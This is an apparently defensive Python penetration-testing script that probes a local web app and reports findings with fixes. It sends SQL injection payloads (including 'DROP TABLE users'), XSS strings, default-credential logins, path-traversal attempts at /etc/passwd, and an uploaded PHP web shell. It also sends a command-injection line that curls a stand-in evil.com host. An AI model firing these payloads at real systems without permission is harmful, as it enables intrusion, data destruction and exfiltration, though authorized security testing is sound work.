#!/usr/bin/env python3
"""
Security Penetration Testing Suite
Automated security tests to identify vulnerabilities and security weaknesses
"""

import requests
import json
import time
import random
import string
import hashlib
import base64
from datetime import datetime
from typing import Dict, List, Tuple
from dataclasses import dataclass
from enum import Enum

class VulnerabilityLevel(Enum):
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CRITICAL = "CRITICAL"

@dataclass
class Vulnerability:
    test_name: str
    level: VulnerabilityLevel
    description: str
    evidence: str
    recommendation: str
    cve_id: str = ""

class PenetrationTestSuite:
    def __init__(self, base_url: str = "http://localhost:3001"):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities: List[Vulnerability] = []
        self.test_results: Dict[str, bool] = {}
        
        # Test credentials
        self.admin_credentials = {
            "username": "admin",
            "password": "admin123"  # Default for testing
        }
        
        self.user_credentials = {
            "username": "testuser",
            "password": "testpass123"
        }

    def run_all_tests(self) -> Dict:
        """Run all penetration tests"""
        print("🔍 Starting Security Penetration Tests")
        print("=" * 50)
        
        test_methods = [
            self.test_sql_injection,
            self.test_xss_vulnerabilities,
            self.test_authentication_bypass,
            self.test_authorization_issues,
            self.test_rate_limiting_bypass,
            self.test_sensitive_data_exposure,
            self.test_csrf_vulnerabilities,
            self.test_file_upload_vulnerabilities,
            self.test_api_endpoints_security,
            self.test_session_management,
            self.test_input_validation,
            self.test_error_disclosure,
            self.test_security_headers,
            self.test_directory_traversal,
            self.test_command_injection
        ]
        
        for test_method in test_methods:
            try:
                print(f"\n🧪 Running {test_method.__name__}...")
                test_method()
                self.test_results[test_method.__name__] = True
                print(f"✅ {test_method.__name__} completed")
            except Exception as e:
                print(f"❌ {test_method.__name__} failed: {e}")
                self.test_results[test_method.__name__] = False
        
        return self.generate_report()

    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL --",
            "'; DROP TABLE users; --",
            "' OR 1=1#",
            "admin'--",
            "' OR 'x'='x",
            "1' OR '1'='1' /*"
        ]
        
        endpoints = [
            "/api/auth/login",
            "/api/gallery/posts",
            "/api/tributes",
            "/api/users/search"
        ]
        
        for endpoint in endpoints:
            for payload in sql_payloads:
                try:
                    # Test in POST data
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json={"username": payload, "password": "test"},
                        timeout=10
                    )
                    
                    # Check for SQL error messages
                    sql_errors = [
                        "SQL syntax",
                        "mysql_fetch",
                        "ORA-",
                        "Microsoft ODBC",
                        "SQLite/JDBCDriver",
                        "PostgreSQL query failed"
                    ]
                    
                    if any(error in response.text.lower() for error in sql_errors):
                        self.add_vulnerability(
                            "SQL Injection",
                            VulnerabilityLevel.HIGH,
                            f"SQL error detected in {endpoint} with payload: {payload}",
                            f"Response: {response.text[:200]}...",
                            "Use parameterized queries and input validation"
                        )
                    
                    # Test in GET parameters
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params={"search": payload},
                        timeout=10
                    )
                    
                    if any(error in response.text.lower() for error in sql_errors):
                        self.add_vulnerability(
                            "SQL Injection (GET)",
                            VulnerabilityLevel.HIGH,
                            f"SQL error detected in {endpoint} with GET payload: {payload}",
                            f"Response: {response.text[:200]}...",
                            "Use parameterized queries and input validation"
                        )
                        
                except requests.RequestException:
                    continue

    def test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting (XSS) vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>"
        ]
        
        endpoints = [
            "/api/gallery/posts",
            "/api/tributes",
            "/api/comments",
            "/api/users/profile"
        ]
        
        for endpoint in endpoints:
            for payload in xss_payloads:
                try:
                    # Test POST requests
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json={"message": payload, "title": payload},
                        timeout=10
                    )
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        self.add_vulnerability(
                            "Cross-Site Scripting (XSS)",
                            VulnerabilityLevel.HIGH,
                            f"XSS payload reflected in {endpoint}",
                            f"Payload: {payload}",
                            "Implement input sanitization and output encoding"
                        )
                    
                    # Test GET requests
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params={"search": payload},
                        timeout=10
                    )
                    
                    if payload in response.text:
                        self.add_vulnerability(
                            "Cross-Site Scripting (XSS) - GET",
                            VulnerabilityLevel.HIGH,
                            f"XSS payload reflected in {endpoint} via GET",
                            f"Payload: {payload}",
                            "Implement input sanitization and output encoding"
                        )
                        
                except requests.RequestException:
                    continue

    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        bypass_attempts = [
            {"username": "admin", "password": ""},
            {"username": "admin", "password": " ' OR '1'='1"},
            {"username": "admin", "password": "admin' --"},
            {"username": "admin", "password": "123456"},
            {"username": "administrator", "password": "password"},
            {"username": "root", "password": "root"},
            {"username": "test", "password": "test"}
        ]
        
        for credentials in bypass_attempts:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json=credentials,
                    timeout=10
                )
                
                # Check if login succeeded unexpectedly
                if response.status_code == 200 and 'token' in response.text:
                    self.add_vulnerability(
                        "Authentication Bypass",
                        VulnerabilityLevel.CRITICAL,
                        f"Authentication bypassed with credentials: {credentials}",
                        f"Response: {response.text[:200]}...",
                        "Implement proper authentication and credential validation"
                    )
                    
            except requests.RequestException:
                continue

    def test_authorization_issues(self):
        """Test for authorization and access control issues"""
        # Try to access admin endpoints without authentication
        admin_endpoints = [
            "/api/admin/users",
            "/api/admin/dashboard",
            "/api/admin/settings",
            "/api/admin/logs"
        ]
        
        for endpoint in admin_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}", timeout=10)
                
                if response.status_code == 200:
                    self.add_vulnerability(
                        "Authorization Bypass",
                        VulnerabilityLevel.HIGH,
                        f"Admin endpoint {endpoint} accessible without authentication",
                        f"Status: {response.status_code}",
                        "Implement proper authorization checks"
                    )
                    
            except requests.RequestException:
                continue

    def test_rate_limiting_bypass(self):
        """Test rate limiting bypass attempts"""
        endpoint = "/api/auth/login"
        
        # Send rapid requests
        for i in range(100):
            try:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"username": "test", "password": "wrong"},
                    timeout=5
                )
                
                # Check if rate limiting is working
                if i > 50 and response.status_code != 429:
                    self.add_vulnerability(
                        "Rate Limiting Bypass",
                        VulnerabilityLevel.MEDIUM,
                        f"Rate limiting not enforced after {i+1} requests",
                        f"Status: {response.status_code}",
                        "Implement proper rate limiting"
                    )
                    break
                    
            except requests.RequestException:
                continue

    def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure"""
        sensitive_endpoints = [
            "/api/config",
            "/api/env",
            "/api/secrets",
            "/api/backup",
            "/api/logs",
            "/.env",
            "/config.json"
        ]
        
        for endpoint in sensitive_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}", timeout=10)
                
                # Check for sensitive information
                sensitive_patterns = [
                    "password",
                    "secret",
                    "key",
                    "token",
                    "database",
                    "connection string",
                    "api_key",
                    "private_key"
                ]
                
                response_text = response.text.lower()
                found_patterns = [pattern for pattern in sensitive_patterns if pattern in response_text]
                
                if found_patterns and response.status_code == 200:
                    self.add_vulnerability(
                        "Sensitive Data Exposure",
                        VulnerabilityLevel.HIGH,
                        f"Sensitive data found in {endpoint}: {found_patterns}",
                        f"Status: {response.status_code}",
                        "Remove sensitive endpoints and implement proper access controls"
                    )
                    
            except requests.RequestException:
                continue

    def test_csrf_vulnerabilities(self):
        """Test for CSRF vulnerabilities"""
        # Check if CSRF tokens are present in forms
        try:
            response = self.session.get(f"{self.base_url}/api/auth/login", timeout=10)
            
            # Look for CSRF protection indicators
            csrf_indicators = [
                "csrf-token",
                "csrf_token",
                "xsrf-token",
                "_token",
                "csrfmiddlewaretoken"
            ]
            
            has_csrf_protection = any(indicator in response.text.lower() for indicator in csrf_indicators)
            
            if not has_csrf_protection:
                self.add_vulnerability(
                    "CSRF Vulnerability",
                    VulnerabilityLevel.MEDIUM,
                    "No CSRF protection detected in authentication forms",
                    "Forms lack CSRF tokens",
                    "Implement CSRF protection in all state-changing requests"
                )
                
        except requests.RequestException:
            pass

    def test_file_upload_vulnerabilities(self):
        """Test for file upload vulnerabilities"""
        malicious_files = [
            ("malicious.php", "<?php system($_GET['cmd']); ?>"),
            ("shell.html", "<script>alert('XSS')</script>"),
            ("exploit.js", "alert('XSS')"),
            ("../../../etc/passwd", "root:x:0:0:root:/root:/bin/bash"),
            ("../../../windows/system32/drivers/etc/hosts", "127.0.0.1 localhost")
        ]
        
        for filename, content in malicious_files:
            try:
                files = {"file": (filename, content)}
                response = self.session.post(
                    f"{self.base_url}/api/gallery/upload",
                    files=files,
                    timeout=10
                )
                
                if response.status_code == 200:
                    self.add_vulnerability(
                        "Malicious File Upload",
                        VulnerabilityLevel.HIGH,
                        f"Malicious file {filename} uploaded successfully",
                        f"Response: {response.text[:200]}...",
                        "Implement file type validation and content scanning"
                    )
                    
            except requests.RequestException:
                continue

    def test_api_endpoints_security(self):
        """Test API endpoint security"""
        # Test for common API vulnerabilities
        api_tests = [
            ("GET", "/api/users", "User enumeration"),
            ("GET", "/api/gallery/posts", "Public gallery access"),
            ("POST", "/api/gallery/posts", "Unauthorized post creation"),
            ("DELETE", "/api/gallery/posts/1", "Unauthorized deletion"),
            ("PUT", "/api/users/1", "Unauthorized user modification")
        ]
        
        for method, endpoint, description in api_tests:
            try:
                if method == "GET":
                    response = self.session.get(f"{self.base_url}{endpoint}", timeout=10)
                elif method == "POST":
                    response = self.session.post(f"{self.base_url}{endpoint}", json={}, timeout=10)
                elif method == "DELETE":
                    response = self.session.delete(f"{self.base_url}{endpoint}", timeout=10)
                elif method == "PUT":
                    response = self.session.put(f"{self.base_url}{endpoint}", json={}, timeout=10)
                
                # Check for unauthorized access
                if response.status_code in [200, 201]:
                    self.add_vulnerability(
                        "API Security Issue",
                        VulnerabilityLevel.MEDIUM,
                        f"{description} - {method} {endpoint}",
                        f"Status: {response.status_code}",
                        "Implement proper API authentication and authorization"
                    )
                    
            except requests.RequestException:
                continue

    def test_session_management(self):
        """Test session management security"""
        try:
            # Test login
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json=self.admin_credentials,
                timeout=10
            )
            
            if response.status_code == 200:
                # Check for secure session handling
                session_data = response.json()
                
                # Look for session token
                if 'token' in session_data:
                    token = session_data['token']
                    
                    # Test token format (should be JWT)
                    if not token.count('.') == 2:  # JWT has 3 parts
                        self.add_vulnerability(
                            "Session Management",
                            VulnerabilityLevel.MEDIUM,
                            "Session token does not follow JWT format",
                            f"Token format: {token[:50]}...",
                            "Use secure JWT tokens for session management"
                        )
                
        except requests.RequestException:
            pass

    def test_input_validation(self):
        """Test input validation"""
        invalid_inputs = [
            {"username": "", "password": "test"},
            {"username": "a" * 1000, "password": "test"},
            {"username": "<script>", "password": "test"},
            {"username": "'; DROP TABLE users; --", "password": "test"},
            {"username": "admin\x00", "password": "test"}
        ]
        
        for invalid_input in invalid_inputs:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json=invalid_input,
                    timeout=10
                )
                
                # Should return validation error, not success
                if response.status_code == 200:
                    self.add_vulnerability(
                        "Input Validation",
                        VulnerabilityLevel.MEDIUM,
                        f"Invalid input accepted: {invalid_input}",
                        f"Status: {response.status_code}",
                        "Implement proper input validation"
                    )
                    
            except requests.RequestException:
                continue

    def test_error_disclosure(self):
        """Test error disclosure vulnerabilities"""
        # Test with invalid requests to trigger errors
        error_triggers = [
            "/api/nonexistent",
            "/api/users/invalid",
            "/api/gallery/posts/99999"
        ]
        
        for endpoint in error_triggers:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}", timeout=10)
                
                # Check for information disclosure in error messages
                error_patterns = [
                    "stack trace",
                    "internal server error",
                    "database error",
                    "sql error",
                    "file path",
                    "line number"
                ]
                
                response_text = response.text.lower()
                found_patterns = [pattern for pattern in error_patterns if pattern in response_text]
                
                if found_patterns:
                    self.add_vulnerability(
                        "Information Disclosure",
                        VulnerabilityLevel.LOW,
                        f"Error message contains sensitive information: {found_patterns}",
                        f"Response: {response.text[:200]}...",
                        "Implement generic error messages"
                    )
                    
            except requests.RequestException:
                continue

    def test_security_headers(self):
        """Test security headers"""
        try:
            response = self.session.get(f"{self.base_url}/", timeout=10)
            
            # Check for important security headers
            required_headers = [
                "X-Content-Type-Options",
                "X-Frame-Options",
                "X-XSS-Protection",
                "Strict-Transport-Security",
                "Content-Security-Policy"
            ]
            
            missing_headers = []
            for header in required_headers:
                if header not in response.headers:
                    missing_headers.append(header)
            
            if missing_headers:
                self.add_vulnerability(
                    "Missing Security Headers",
                    VulnerabilityLevel.MEDIUM,
                    f"Missing security headers: {missing_headers}",
                    f"Headers present: {list(response.headers.keys())}",
                    "Implement all recommended security headers"
                )
                
        except requests.RequestException:
            pass

    def test_directory_traversal(self):
        """Test directory traversal vulnerabilities"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for payload in traversal_payloads:
            try:
                response = self.session.get(
                    f"{self.base_url}/api/files/{payload}",
                    timeout=10
                )
                
                # Check if file content is returned
                if response.status_code == 200 and len(response.text) > 100:
                    self.add_vulnerability(
                        "Directory Traversal",
                        VulnerabilityLevel.HIGH,
                        f"Directory traversal successful with payload: {payload}",
                        f"Response length: {len(response.text)}",
                        "Implement proper path validation and sanitization"
                    )
                    
            except requests.RequestException:
                continue

    def test_command_injection(self):
        """Test command injection vulnerabilities"""
        command_payloads = [
            "; ls -la",
            "| whoami",
            "& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; curl http://evil.com/$(whoami)"
        ]
        
        for payload in command_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/search",
                    json={"query": payload},
                    timeout=10
                )
                
                # Check for command output
                command_indicators = [
                    "root:", "uid=", "gid=", "groups=",
                    "total ", "drwx", "-rw-"
                ]
                
                if any(indicator in response.text for indicator in command_indicators):
                    self.add_vulnerability(
                        "Command Injection",
                        VulnerabilityLevel.CRITICAL,
                        f"Command injection successful with payload: {payload}",
                        f"Response: {response.text[:200]}...",
                        "Avoid executing system commands with user input"
                    )
                    
            except requests.RequestException:
                continue

    def add_vulnerability(self, test_name: str, level: VulnerabilityLevel, 
                         description: str, evidence: str, recommendation: str):
        """Add a vulnerability to the results"""
        vulnerability = Vulnerability(
            test_name=test_name,
            level=level,
            description=description,
            evidence=evidence,
            recommendation=recommendation
        )
        self.vulnerabilities.append(vulnerability)

    def generate_report(self) -> Dict:
        """Generate penetration test report"""
        # Count vulnerabilities by level
        vulnerability_counts = {
            VulnerabilityLevel.CRITICAL: 0,
            VulnerabilityLevel.HIGH: 0,
            VulnerabilityLevel.MEDIUM: 0,
            VulnerabilityLevel.LOW: 0
        }
        
        for vuln in self.vulnerabilities:
            vulnerability_counts[vuln.level] += 1
        
        # Calculate risk score
        risk_scores = {
            VulnerabilityLevel.CRITICAL: 10,
            VulnerabilityLevel.HIGH: 5,
            VulnerabilityLevel.MEDIUM: 2,
            VulnerabilityLevel.LOW: 1
        }
        
        total_risk_score = sum(
            risk_scores[vuln.level] for vuln in self.vulnerabilities
        )
        
        # Determine overall security posture
        if vulnerability_counts[VulnerabilityLevel.CRITICAL] > 0:
            security_posture = "CRITICAL"
        elif vulnerability_counts[VulnerabilityLevel.HIGH] > 2:
            security_posture = "HIGH_RISK"
        elif vulnerability_counts[VulnerabilityLevel.HIGH] > 0:
            security_posture = "MEDIUM_RISK"
        elif vulnerability_counts[VulnerabilityLevel.MEDIUM] > 3:
            security_posture = "MEDIUM_RISK"
        else:
            security_posture = "LOW_RISK"
        
        return {
            "test_summary": {
                "timestamp": datetime.now().isoformat(),
                "target": self.base_url,
                "tests_run": len(self.test_results),
                "tests_passed": sum(1 for passed in self.test_results.values() if passed),
                "total_vulnerabilities": len(self.vulnerabilities),
                "risk_score": total_risk_score,
                "security_posture": security_posture
            },
            "vulnerability_counts": {
                level.value: count for level, count in vulnerability_counts.items()
            },
            "vulnerabilities": [
                {
                    "test_name": vuln.test_name,
                    "level": vuln.level.value,
                    "description": vuln.description,
                    "evidence": vuln.evidence,
                    "recommendation": vuln.recommendation
                }
                for vuln in self.vulnerabilities
            ],
            "test_results": self.test_results,
            "recommendations": self.generate_recommendations()
        }

    def generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []
        
        if any(vuln.level == VulnerabilityLevel.CRITICAL for vuln in self.vulnerabilities):
            recommendations.append("IMMEDIATE ACTION REQUIRED: Address all critical vulnerabilities")
        
        if any(vuln.level == VulnerabilityLevel.HIGH for vuln in self.vulnerabilities):
            recommendations.append("HIGH PRIORITY: Address high-risk vulnerabilities within 7 days")
        
        if len(self.vulnerabilities) > 10:
            recommendations.append("Conduct comprehensive security review and code audit")
        
        if any("SQL" in vuln.test_name for vuln in self.vulnerabilities):
            recommendations.append("Implement parameterized queries and input validation")
        
        if any("XSS" in vuln.test_name for vuln in self.vulnerabilities):
            recommendations.append("Implement Content Security Policy and output encoding")
        
        if any("Authentication" in vuln.test_name for vuln in self.vulnerabilities):
            recommendations.append("Strengthen authentication mechanisms and implement MFA")
        
        if len(recommendations) == 0:
            recommendations.append("Continue regular security monitoring and testing")
        
        return recommendations

def main():
    """Main function to run penetration tests"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Security Penetration Testing Suite')
    parser.add_argument('--url', default='http://localhost:3001', help='Target URL')
    parser.add_argument('--output', help='Output file for report')
    parser.add_argument('--format', choices=['json', 'text'], default='json', help='Report format')
    
    args = parser.parse_args()
    
    # Run penetration tests
    pentest_suite = PenetrationTestSuite(args.url)
    report = pentest_suite.run_all_tests()
    
    # Print summary
    print("\n" + "=" * 50)
    print("🔍 PENETRATION TEST RESULTS")
    print("=" * 50)
    
    summary = report["test_summary"]
    print(f"Target: {summary['target']}")
    print(f"Tests Run: {summary['tests_run']}")
    print(f"Tests Passed: {summary['tests_passed']}")
    print(f"Vulnerabilities Found: {summary['total_vulnerabilities']}")
    print(f"Risk Score: {summary['risk_score']}")
    print(f"Security Posture: {summary['security_posture']}")
    
    print(f"\n📊 Vulnerability Breakdown:")
    for level, count in report["vulnerability_counts"].items():
        if count > 0:
            print(f"  {level}: {count}")
    
    if report["vulnerabilities"]:
        print(f"\n🚨 Critical Vulnerabilities:")
        for vuln in report["vulnerabilities"]:
            if vuln["level"] == "CRITICAL":
                print(f"  - {vuln['description']}")
    
    print(f"\n💡 Recommendations:")
    for rec in report["recommendations"]:
        print(f"  - {rec}")
    
    # Save report
    if args.output:
        if args.format == 'json':
            with open(args.output, 'w') as f:
                json.dump(report, f, indent=2)
        else:
            with open(args.output, 'w') as f:
                f.write(str(report))
        
        print(f"\n📄 Report saved to: {args.output}")
    
    return report["test_summary"]["risk_score"]

if __name__ == "__main__":
    risk_score = main()
    exit(0 if risk_score < 20 else 1)
